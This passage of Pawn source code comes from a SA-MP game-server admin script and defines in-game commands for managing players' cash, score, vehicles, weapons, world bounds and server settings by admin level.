	} else return SendClientMessage(playerid,red,"ERROR:{FF9E00} You must be logged in to use this commands");
}

CMD:sbankrupt(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 3) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /sbankrupt [playerid]");
		new player1 = strval(params), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"BANKRUPT");
			format(string, sizeof(string), "You have silently reset \"%s's\" cash", pName(player1)); SendClientMessage(playerid,blue,string);
   			return ResetPlayerMoney(player1);
	    } else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:time(playerid,params[]) {
	#pragma unused params
	new string[64], hour,minuite,second; gettime(hour,minuite,second);
	format(string, sizeof(string), "~g~|~w~%d:%d~g~|", hour, minuite);
	return GameTextForPlayer(playerid, string, 5000, 1);
}

CMD:ubound(playerid,params[]) {
 	if(PlayerInfo[playerid][Level] >= 3) {
		if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /ubound [playerid]");
	    new string[128], player1 = strval(params);

	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"UBOUND");
			SetPlayerWorldBounds(player1, 9999.9, -9999.9, 9999.9, -9999.9 );
			format(string, sizeof(string), "Administrator %s has removed your world boundaries", PlayerName2(playerid)); if(player1 != playerid) SendClientMessage(player1,blue,string);
			format(string,sizeof(string),"You have removed %s's world boundaries", PlayerName2(player1));
			return SendClientMessage(playerid,blue,string);
		} else return SendClientMessage(playerid, red, "Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:lhelp(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][LoggedIn] && PlayerInfo[playerid][Level] >= 1) {
		SendClientMessage(playerid,blue,"--== [ LAdmin Help ] ==--");
		SendClientMessage(playerid,blue, "For admin commands type:  /lcommands   |   Credits: /lcredits");
		SendClientMessage(playerid,blue, "Account commands are: /register, /login, /changepass, /stats, /resetstats.  Also  /time, /report");
		SendClientMessage(playerid,blue, "There are 5 levels. Level 5 admins are immune from commands");
		SendClientMessage(playerid,blue, "IMPORTANT: The filterscript must be reloaded if you change gamemodes");
		}
	else if(PlayerInfo[playerid][LoggedIn] && PlayerInfo[playerid][Level] < 1) {
	 	SendClientMessage(playerid,green, "Your commands are: /register, /login, /report, /stats, /time, /changepass, /resetstats, /getid");
 	}
	else if(PlayerInfo[playerid][LoggedIn] == 0) {
 	SendClientMessage(playerid,green, "Your commands are: /time, /getid     (You are not logged in, log in for more commands)");
	} return 1;
}

CMD:lcmds(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] > 0)
	{
		SendClientMessage(playerid,blue,"    ---= [ Most Useful Admin Commands ] ==---");
		SendClientMessage(playerid,lightblue,"GENERAL: getinfo, lmenu, announce, write, miniguns, richlist, lspec(off), move, lweaps, adminarea, countdown, duel, giveweapon");
		SendClientMessage(playerid,lightblue,"GENERAL: slap, burn, warn, kick, ban, explode, jail, freeze, mute, crash, ubound, god, godcar, ping");
		SendClientMessage(playerid,lightblue,"GENERAL: setping, lockserver, enable/disable, setlevel, setinterior, givecar, jetpack, force, spawn");
		SendClientMessage(playerid,lightblue,"VEHICLE: flip, fix, repair, lockcar, eject, ltc, car, lcar, lbike, lplane, lheli, lboat, lnos, cm");
		SendClientMessage(playerid,lightblue,"TELE: goto, gethere, get, teleplayer, ltele, vgoto, lgoto, moveplayer");
		SendClientMessage(playerid,lightblue,"SET: set(cash/health/armour/gravity/name/time/weather/skin/colour/wanted/templevel)");
		SendClientMessage(playerid,lightblue,"SETALL: setall(world/weather/wanted/time/score/cash)");
		SendClientMessage(playerid,lightblue,"ALL: giveallweapon, healall, armourall, freezeall, kickall, ejectall, killall, disarmall, slapall, spawnall");
	}
	return 1;
}

CMD:lcommands(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1)
	{
		SendClientMessage(playerid,blue,"    ---= All Admin Commands =---");
		SendClientMessage(playerid,lightblue," /level1, /level2, /level3, /level4, /level5, /level6 ,/rcon ladmin");
		SendClientMessage(playerid,lightblue,"Player Commands: /register, /login, /report, /stats, /time, /changepass, /resetstats, /getid");
	}
	return 1;
}

CMD:acmds(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1)
	{
	ShowPlayerDialog(playerid,786,DIALOG_STYLE_LIST,"Chose any level","{FCF7F9}Level 1 \n{1C9139}Level 2\n{2D5CAD}Level 3\n{E8B82A}Level 4\n{FF0000}Level 5\n{16F2E7}Level 6","Select","Cancel");
	  } else return SendClientMessage(playerid,red,"ERROR: You Need To Be Atleast Level 1 To Use This Command");
	return 1;
}
CMD:level2(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 2)
	{
		SendClientMessage(playerid,blue,"    ---=Level 2 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"giveweapon, setcolour, lockcar, unlockcar, burn, spawn, disarm, lcar, lbike,");
		SendClientMessage(playerid,lightblue,"lheli, lboat, lplane, hightlight, announce, announce2, screen, jetpack, flip,");
		SendClientMessage(playerid,lightblue,"goto, vgoto, lgoto, fu, kick, warn, slap, jailed, frozen, mute, unmute, muted,");
		SendClientMessage(playerid,lightblue,"laston, ls, lsof, lsv, clearchat, lmenu, ltele, cm, ltmenu,");
		SendClientMessage(playerid,lightblue,"write,explode,burn,async,ban");
	}
	return 1;
}

CMD:level3(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 3)
	{
		SendClientMessage(playerid,blue,"    ---=Level 3 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"sethealth, setarmour, setcash, setskin, setwanted, setweather,");
		SendClientMessage(playerid,lightblue,"settime, setworld, setinterior, force, eject, bankrupt, sbankrupt, ubound, lweaps,");
		SendClientMessage(playerid,lightblue,"lammo, countdown, duel, car, carhealth, carcolour, setping, setgravity, destroycar,");
		SendClientMessage(playerid,lightblue,"teleplayer, vget, givecar, gethere, get, jail, unjail, freeze, ");
		SendClientMessage(playerid,lightblue,"unfreeze, akill,aka, disablechat, ban, clearallchat, caps, move, moveplayer, healall,");
		SendClientMessage(playerid,lightblue,"setallweather, setalltime, setallworld, unfreezeall");
		SendClientMessage(playerid,lightblue,"lweather, ltime, lweapons, setpass,changename");
	}
	return 1;
}

CMD:level4(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 4)
	{
		SendClientMessage(playerid,blue,"    ---=Level 4 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"enable, disable, ban, rban, crash, spam, god, godcar, die, uconfig,");
		SendClientMessage(playerid,lightblue,"botcheck, lockserver, unlockserver, forbidname, forbidword, ");
		SendClientMessage(playerid,lightblue,"fakedeath, spawnall, muteall, unmuteall, getall, killall, freezeall, Giveallweapon, Armourall, GiveAllcash.");
		SendClientMessage(playerid,lightblue,"kickall, slapalll, explodeall, disarmall, ejectall, SetAllcash, Setallscore");
		SendClientMessage(playerid,lightblue,",setname");
	}
	return 1;
}

CMD:level5(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 5)
	{
		SendClientMessage(playerid,blue,"    ---=Level 5 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"god, sgod, pickup, object, fakechat, setallscore.");
		SendClientMessage(playerid,lightblue,"setmoderator, unsetmoderator, setlevel, settemplevel , setkills, setdeaths");
	}
	return 1;
}

CMD:level6(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 6)
	{
		SendClientMessage(playerid,blue,"    ---=Level 6 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"saveallstats");
	}
	return 1;
}

CMD:ahelp(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Helper] == 1)
	{
		SendClientMessage(playerid,blue,"    ---= Help moderator Commands =---");
		SendClientMessage(playerid,lightblue,"lspec(ls), lspecoff(lsoff),lsv, warn, IP, Weaps, kick, ,[TEXT], hsay.");
		SendClientMessage(playerid,lightblue,"reports, afk");
	}
	return 1;
}

CMD:lconfig(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] > 0)
	{
	    new string[128];
		SendClientMessage(playerid,blue,"    ---=== LAdmin Configuration ===---");
		format(string, sizeof(string), "Max Ping: %dms | ReadPms %d | ReadCmds %d | Max Admin Level %d | AdminOnlySkins %d", ServerInfo[MaxPing],  ServerInfo[ReadPMs],  ServerInfo[ReadCmds],  ServerInfo[MaxAdminLevel],  ServerInfo[AdminOnlySkins] );
		SendClientMessage(playerid,blue,string);
		format(string, sizeof(string), "AdminSkin1 %d | AdminSkin2 %d | NameKick %d | AntiSpam %d | AntiSwear %d", ServerInfo[AdminSkin], ServerInfo[AdminSkin2], ServerInfo[NameKick], ServerInfo[AntiSpam], ServerInfo[AntiSwear] );
		SendClientMessage(playerid,blue,string);
		format(string, sizeof(string), "NoCaps %d | Locked %d | Pass %s | SaveWeaps %d | SaveMoney %d | ConnectMessages %d | AdminCmdMsgs %d", ServerInfo[NoCaps], ServerInfo[Locked], ServerInfo[Password], ServerInfo[GiveWeap], ServerInfo[GiveMoney], ServerInfo[ConnectMessages], ServerInfo[AdminCmdMsg] );
		SendClientMessage(playerid,blue,string);
		format(string, sizeof(string), "AutoLogin %d | MaxMuteWarnings %d | ChatDisabled %d | MustLogin %d | MustRegister %d", ServerInfo[AutoLogin], ServerInfo[MaxMuteWarnings], ServerInfo[DisableChat], ServerInfo[MustLogin], ServerInfo[MustRegister] );
		SendClientMessage(playerid,blue,string);
	}
	return 1;
}

CMD:getinfo(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid,red,"USAGE: /getinfo [playerid]");
	    new player1, string[128];
	    player1 = strval(params);

	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
		    new Float:player1health, Float:player1armour, playerip[128], Float:x, Float:y, Float:z, tmp2[256], file[256],
				year, month, day, P1Jailed[4], P1Frozen[4], P1Logged[4], P1Register[4], RegDate[256], TimesOn;

			GetPlayerHealth(player1,player1health);
			GetPlayerArmour(player1,player1armour);
	    	GetPlayerIp(player1, playerip, sizeof(playerip));
	    	GetPlayerPos(player1,x,y,z);
			getdate(year, month, day);
			format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(PlayerName2(player1)));

			if(PlayerInfo[player1][Jailed] == 1) P1Jailed = "Yes"; else P1Jailed = "No";
			if(PlayerInfo[player1][Frozen] == 1) P1Frozen = "Yes"; else P1Frozen = "No";
			if(PlayerInfo[player1][LoggedIn] == 1) P1Logged = "Yes"; else P1Logged = "No";
			if(fexist(file)) P1Register = "Yes"; else P1Register = "No";
			if(dUserINT(PlayerName2(player1)).("LastOn")==0) tmp2 = "Never"; else tmp2 = dini_Get(file,"LastOn");
			if(strlen(dini_Get(file,"RegisteredDate")) < 3) RegDate = "n/a"; else RegDate = dini_Get(file,"RegisteredDate");
			TimesOn = dUserINT(PlayerName2(player1)).("TimesOnServer");

	  		format(string, sizeof(string),"(Player Info)  ---====> Name: %s  ID: %d <====---", PlayerName2(player1), player1);
			SendClientMessage(playerid,lightblue,string);
		  	format(string, sizeof(string),"Health: %d  Armour: %d  Score: %d  Cash: %d  Skin: %d  IP: %s Ping: %d",floatround(player1health),floatround(player1armour),
			GetPlayerScore(player1),GetPlayerMoney(player1),GetPlayerSkin(player1),playerip,GetPlayerPing(player1));
			SendClientMessage(playerid,red,string);
			format(string, sizeof(string),"Interior: %d  Virtual World: %d  Wanted Level: %d  X %0.1f  Y %0.1f  Z %0.1f", GetPlayerInterior(player1), GetPlayerVirtualWorld(player1), GetPlayerWantedLevel(player1), Float:x,Float:y,Float:z);
			SendClientMessage(playerid,orange,string);
			format(string, sizeof(string),"Times On Server: %d  Kills: %d  Deaths: %d  Ratio: %0.2f  AdminLevel: %d", TimesOn, PlayerInfo[player1][Kills], PlayerInfo[player1][Deaths], Float:PlayerInfo[player1][Kills]/Float:PlayerInfo[player1][Deaths], PlayerInfo[player1][Level] );
			SendClientMessage(playerid,yellow,string);
			format(string, sizeof(string),"Registered: %s  Logged In: %s  In Jail: %s  Frozen: %s", P1Register, P1Logged, P1Jailed, P1Frozen );
			SendClientMessage(playerid,green,string);
			format(string, sizeof(string),"Last On Server: %s  Register Date: %s  Todays Date: %d/%d/%d", tmp2, RegDate, day,month,year );
			SendClientMessage(playerid,COLOR_GREEN,string);

			if(IsPlayerInAnyVehicle(player1)) {
				new Float:VHealth, carid = GetPlayerVehicleID(playerid); GetVehicleHealth(carid,VHealth);
				format(string, sizeof(string),"VehicleID: %d  Model: %d  Vehicle Name: %s  Vehicle Health: %d",carid, GetVehicleModel(carid), VehicleNames[GetVehicleModel(carid)-400], floatround(VHealth) );
				SendClientMessage(playerid,COLOR_BLUE,string);
			}

			new slot, ammo, weap, cnt, WeapName[24], WeapSTR[128], p; WeapSTR = "Weaps: ";
			for (slot = 0; slot < 14; slot++) {	GetPlayerWeaponData(player1, slot, weap, ammo); if( ammo != 0 && weap != 0) cnt++; }
			if(cnt < 1) return SendClientMessage(playerid,lightblue,"Player has no weapons");
			else {
				for (slot = 0; slot < 14; slot++)
				{
					GetPlayerWeaponData(player1, slot, weap, ammo);
					if (ammo > 0 && weap > 0)
					{
						GetWeaponName(weap, WeapName, sizeof(WeapName) );
						if (ammo == 65535 || ammo == 1) format(WeapSTR,sizeof(WeapSTR),"%s%s (1)",WeapSTR, WeapName);
						else format(WeapSTR,sizeof(WeapSTR),"%s%s (%d)",WeapSTR, WeapName, ammo);
						p++;
						if(p >= 5) { SendClientMessage(playerid, lightblue, WeapSTR); format(WeapSTR, sizeof(WeapSTR), "Weaps: "); p = 0;
						} else format(WeapSTR, sizeof(WeapSTR), "%s,  ", WeapSTR);
					}
				}
				if(p <= 4 && p > 0) {
					string[strlen(string)-3] = '.';
				    SendClientMessage(playerid, lightblue, WeapSTR);
				}
			}
			return 1;
		} else return SendClientMessage(playerid,red,"ERROR: Player is not connected");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be administrator level 2 to use this command");
}

CMD:disable(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) {
			SendClientMessage(playerid,red,"USAGE: /disable [antiswear / namekick / antispam / ping / readcmds / readpms /caps / admincmdmsgs");
			return SendClientMessage(playerid,red,"       /connectmsgs / autologin ]");
		}
	    new string[128], file[256]; format(file,sizeof(file),"ladmin/config/Config.ini");
		if(strcmp(params,"antiswear",true) == 0) {
			ServerInfo[AntiSwear] = 0;
			dini_IntSet(file,"AntiSwear",0);
			format(string,sizeof(string),"Administrator %s has disabled antiswear", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
		} else if(strcmp(params,"namekick",true) == 0) {
			ServerInfo[NameKick] = 0;
			dini_IntSet(file,"NameKick",0);
			format(string,sizeof(string),"Administrator %s has disabled namekick", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
	 	} else if(strcmp(params,"antispam",true) == 0)	{
			ServerInfo[AntiSpam] = 0;
			dini_IntSet(file,"AntiSpam",0);
			format(string,sizeof(string),"Administrator %s has disabled antispam", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
		} else if(strcmp(params,"ping",true) == 0)	{
			ServerInfo[MaxPing] = 0;
			dini_IntSet(file,"MaxPing",0);
			format(string,sizeof(string),"Administrator %s has disabled ping kick", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
		} else if(strcmp(params,"readcmds",true) == 0) {
			ServerInfo[ReadCmds] = 0;
			dini_IntSet(file,"ReadCMDs",0);
			format(string,sizeof(string),"Administrator %s has disabled reading commands", PlayerName2(playerid));
			MessageToAdmins(blue,string);
		} else if(strcmp(params,"readpms",true) == 0) {
			ServerInfo[ReadPMs] = 0;
			dini_IntSet(file,"ReadPMs",0);
			format(string,sizeof(string),"Administrator %s has disabled reading pms", PlayerName2(playerid));
			MessageToAdmins(blue,string);
  		} else if(strcmp(params,"caps",true) == 0)	{
			ServerInfo[NoCaps] = 1;
			dini_IntSet(file,"NoCaps",1);
			format(string,sizeof(string),"Administrator %s has prevented captial letters in chat", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
		} else if(strcmp(params,"admincmdmsgs",true) == 0) {
			ServerInfo[AdminCmdMsg] = 0;
			dini_IntSet(file,"AdminCMDMessages",0);
			format(string,sizeof(string),"Administrator %s has disabled admin command messages", PlayerName2(playerid));
			MessageToAdmins(green,string);
		} else if(strcmp(params,"connectmsgs",true) == 0)	{
			ServerInfo[ConnectMessages] = 0;
			dini_IntSet(file,"ConnectMessages",0);
			format(string,sizeof(string),"Administrator %s has disabled connect & disconnect messages", PlayerName2(playerid));
			MessageToAdmins(green,string);
		} else if(strcmp(params,"autologin",true) == 0)	{
			ServerInfo[AutoLogin] = 0;
			dini_IntSet(file,"AutoLogin",0);
			format(string,sizeof(string),"Administrator %s has disabled auto login", PlayerName2(playerid));
			MessageToAdmins(green,string);
		} else {
			SendClientMessage(playerid,red,"USAGE: /disable [antiswear / namekick / antispam / ping / readcmds / readpms /caps /cmdmsg ]");
		} return 1;
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:enable(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 4 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) {
			SendClientMessage(playerid,red,"USAGE: /enable [antiswear / namekick / antispam / ping / readcmds / readpms /caps / admincmdmsgs");
			return SendClientMessage(playerid,red,"       /connectmsgs / autologin ]");
		}
	    new string[128], file[256]; format(file,sizeof(file),"ladmin/config/Config.ini");
		if(strcmp(params,"antiswear",true) == 0) {
			ServerInfo[AntiSwear] = 1;
			dini_IntSet(file,"AntiSwear",1);
			format(string,sizeof(string),"Administrator %s has enabled antiswear", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
		} else if(strcmp(params,"namekick",true) == 0)	{
			ServerInfo[NameKick] = 1;
			format(string,sizeof(string),"Administrator %s has enabled namekick", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
 		} else if(strcmp(params,"antispam",true) == 0)	{
			ServerInfo[AntiSpam] = 1;
			dini_IntSet(file,"AntiSpam",1);
			format(string,sizeof(string),"Administrator %s has enabled antispam", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
		} else if(strcmp(params,"ping",true) == 0)	{
			ServerInfo[MaxPing] = 800;
			dini_IntSet(file,"MaxPing",800);
			format(string,sizeof(string),"Administrator %s has enabled ping kick", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
		} else if(strcmp(params,"readcmds",true) == 0)	{
			ServerInfo[ReadCmds] = 1;
			dini_IntSet(file,"ReadCMDs",1);
			format(string,sizeof(string),"Administrator %s has enabled reading commands", PlayerName2(playerid));
			MessageToAdmins(blue,string);
		} else if(strcmp(params,"readpms",true) == 0) {
			ServerInfo[ReadPMs] = 1;
			dini_IntSet(file,"ReadPMs",1);
			format(string,sizeof(string),"Administrator %s has enabled reading pms", PlayerName2(playerid));
			MessageToAdmins(blue,string);
		} else if(strcmp(params,"caps",true) == 0)	{
			ServerInfo[NoCaps] = 0;
			dini_IntSet(file,"NoCaps",0);
			format(string,sizeof(string),"Administrator %s has allowed captial letters in chat", PlayerName2(playerid));
			SendClientMessageToAll(blue,string);
		} else if(strcmp(params,"admincmdmsgs",true) == 0)	{
			ServerInfo[AdminCmdMsg] = 1;
			dini_IntSet(file,"AdminCmdMessages",1);
			format(string,sizeof(string),"Administrator %s has enabled admin command messages", PlayerName2(playerid));
			MessageToAdmins(green,string);
		} else if(strcmp(params,"connectmsgs",true) == 0) {
			ServerInfo[ConnectMessages] = 1;
			dini_IntSet(file,"ConnectMessages",1);
			format(string,sizeof(string),"Administrator %s has enabled connect & disconnect messages", PlayerName2(playerid));
			MessageToAdmins(green,string);
		} else if(strcmp(params,"autologin",true) == 0) {
			ServerInfo[AutoLogin] = 1;
			dini_IntSet(file,"AutoLogin",1);
			format(string,sizeof(string),"Administrator %s has enabled auto login", PlayerName2(playerid));
			MessageToAdmins(green,string);
		} else {
			SendClientMessage(playerid,red,"USAGE: /enable [antiswear / namekick / antispam / ping / readcmds / readpms /caps /cmdmsg ]");
		} return 1;
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:lweaps(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 3) {
		GivePlayerWeapon(playerid,28,1000); GivePlayerWeapon(playerid,31,1000); GivePlayerWeapon(playerid,34,1000);
		GivePlayerWeapon(playerid,38,1000); GivePlayerWeapon(playerid,16,1000);	GivePlayerWeapon(playerid,42,1000);
		GivePlayerWeapon(playerid,14,1000); GivePlayerWeapon(playerid,46,1000);	GivePlayerWeapon(playerid,9,1);
		GivePlayerWeapon(playerid,24,1000); GivePlayerWeapon(playerid,26,1000); return 1;
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 3 to use this command");
}


CMD:lammo(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 5) {
		MaxAmmo(playerid);
		return CMDMessageToAdmins(playerid,"LAMMO");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 3 to use this command");
}
CMD:update(playerid,params[]) {
#pragma unused params
 SavePlayer(playerid);
 SendClientMessage(playerid,green,"Stats Saved!");
 return 1;
}

CMD:vr(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1) {
		if (IsPlayerInAnyVehicle(playerid)) {
			RepairVehicle(GetPlayerVehicleID(playerid));
			SetVehicleHealth(GetPlayerVehicleID(playerid), 1000);
	    	return SendClientMessage(playerid,blue,"Your Vehicle Repaired.");
		} else return SendClientMessage(playerid,red,"Error: You are not in a vehicle");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
}

CMD:repair(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1) {
		if (IsPlayerInAnyVehicle(playerid)) {
			RepairVehicle(GetPlayerVehicleID(playerid));
			SetVehicleHealth(GetPlayerVehicleID(playerid), 1000);
	    	return SendClientMessage(playerid,blue,"Your Vehicle Repaired.");
		} else return SendClientMessage(playerid,red,"Error: You are not in a vehicle");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
}

CMD:ltune(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1) {
		if(IsPlayerInAnyVehicle(playerid)) {
        new LVehicleID = GetPlayerVehicleID(playerid), LModel = GetVehicleModel(LVehicleID);
        switch(LModel)
		{
			case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
			return SendClientMessage(playerid,red,"ERROR: You can not tune this vehicle");
		}
        CMDMessageToAdmins(playerid,"LTUNE");
		SetVehicleHealth(LVehicleID,2000.0);
		TuneLCar(LVehicleID);
		return PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
		} else return SendClientMessage(playerid,red,"Error: You are not in a vehicle");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
}

CMD:lhy(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1) {
		if(IsPlayerInAnyVehicle(playerid)) {
        new LVehicleID = GetPlayerVehicleID(playerid), LModel = GetVehicleModel(LVehicleID);
        switch(LModel)
		{
			case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
			return SendClientMessage(playerid,red,"ERROR: You can not tune this vehicle!");
		}
        AddVehicleComponent(LVehicleID, 1087);
		return PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
		} else return SendClientMessage(playerid,red,"Error: You are not in a vehicle");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
}

CMD:lcar(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 2) {
		if (!IsPlayerInAnyVehicle(playerid)) {
			CarSpawner(playerid,415);
			CMDMessageToAdmins(playerid,"LCAR");
			return SendClientMessage(playerid,blue,"Enjoy your new car");
		} else return SendClientMessage(playerid,red,"Error: You already have a vehicle");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 2 to use this command");
}

CMD:gas(playerid,params[])
{
    if(PlayerInfo[playerid][Level] >= 4) {
      new tmp[256], Index; tmp = strtok(params,Index);
      if(isnull(tmp) || !IsNumeric(tmp)) return SendClientMessage(playerid, red, "USAGE: /gas [score]");
        new score = strval(tmp), string[128];
        CMDMessageToAdmins(playerid,"GIVEALLSCORE");
        for(new i;i<GetMaxPlayers();i++)
        {
        SetPlayerScore(i,GetPlayerScore(i)+score);
        PlayerPlaySound(i, 1057,0.0,0.0,0.0);
        }
        format(string,128,"Administrator \"%s\" has given all players '%d' Score!",pName(playerid),score);
        SendClientMessageToAll(blue, string);
    } else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
    return 1;
}
CMD:givescore(playerid, params[])
{
	if(PlayerInfo[playerid][Level] >= 4)
	{
    new giveplayerid,
    amount,
    gscore = GetPlayerScore(playerid);
    if(sscanf(params, "ud", giveplayerid, amount)) return SendClientMessage(playerid, 0xFF0000AA, "USAGE: /givescore [playerid/partname] [amount]");
    else if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, 0xFF0000AA, "ERROR: Player not found");
    else if(amount > gscore) return SendClientMessage(playerid, 0xFF0000AA, "ERROE:Unknown Score");
    {
        SetPlayerScore(giveplayerid,GetPlayerScore(giveplayerid) + amount);
        SendClientMessage(playerid, 0x00FF00AA, "Score Sent");
        SendClientMessage(giveplayerid, 0x00FF00AA, "You Recieved Scores From an admin");
    }
	if(PlayerInfo[playerid][Level] <= 4)
	{
	SendClientMessage(playerid, red, "ERROR: You are not a high enough level to use this command");
    }
    }
	return 1;
}
CMD:giveallscore(playerid,params[])
{
    if(PlayerInfo[playerid][Level] >= 4) {
        new score;
        if(sscanf(params,"d",score)) return SendClientMessage(playerid, red, "USAGE: /giveallscore [score]");
        new string[128];
        CMDMessageToAdmins(playerid,"GIVEALLSCORE");
        for(new i;i<GetMaxPlayers();i++)
        {
	        SetPlayerScore(i,GetPlayerScore(i)+score);
	        PlayerPlaySound(i, 1057,0.0,0.0,0.0);
        }
        format(string,128,"Administrator \"%s\" has given all players '%d' Score!",pName(playerid),score);
        SendClientMessageToAll(blue, string);
    } else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
    return 1;
}
CMD:lbike(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 2) {
		if (!IsPlayerInAnyVehicle(playerid)) {
			CarSpawner(playerid,522);
			CMDMessageToAdmins(playerid,"LBIKE");
			return SendClientMessage(playerid,blue,"Enjoy your new bike");
		} else return SendClientMessage(playerid,red,"Error: You already have a vehicle");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 2 to use this command");
}

CMD:lheli(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 2) {
		if (!IsPlayerInAnyVehicle(playerid)) {
			CarSpawner(playerid,487);
			CMDMessageToAdmins(playerid,"LHELI");
			return SendClientMessage(playerid,blue,"Enjoy your new helicopter");
		} else return SendClientMessage(playerid,red,"Error: You already have a vehicle");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 2 to use this command");
}

CMD:lboat(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 2) {
		if (!IsPlayerInAnyVehicle(playerid)) {
			CarSpawner(playerid,493);
			CMDMessageToAdmins(playerid,"LBOAT");
			return SendClientMessage(playerid,blue,"Enjoy your new boat");
		} else return SendClientMessage(playerid,red,"Error: You already have a vehicle");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 2 to use this command");
}

CMD:lplane(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 2) {
		if (!IsPlayerInAnyVehicle(playerid)) {
			CarSpawner(playerid,513);
			CMDMessageToAdmins(playerid,"LPLANE");
			return SendClientMessage(playerid,blue,"Enjoy your new plane");
		} else return SendClientMessage(playerid,red,"Error: You already have a vehicle");
	} else return SendClientMessage(playerid,red,"ERROR: You need to be level 2 to use this command");
}

CMD:lnos(playerid,params[]) {
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1) {
		if(IsPlayerInAnyVehicle(playerid)) {
	        switch(GetVehicleModel( GetPlayerVehicleID(playerid) )) {
				case 448,461,462,463,468,471,509,510,521,522,523,581,586,449:
				return SendClientMessage(playerid,red,"ERROR: You can not tune this vehicle!");
			}
	        AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
			return PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
		} else return SendClientMessage(playerid,red,"ERROR: You must be in a vehicle.");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}

CMD:linkcar(playerid,params[]) {
	#pragma unused params
	if(IsPlayerInAnyVehicle(playerid)) {
    	LinkVehicleToInterior(GetPlayerVehicleID(playerid),GetPlayerInterior(playerid));
	    SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),GetPlayerVirtualWorld(playerid));
	    return SendClientMessage(playerid,lightblue, "Your vehicle is now in your virtual world and interior");
	} else return SendClientMessage(playerid,red,"ERROR: You must be in a vehicle.");
 }
CMD:savepos(playerid, params[])
{
if(IsPlayerConnected(playerid))
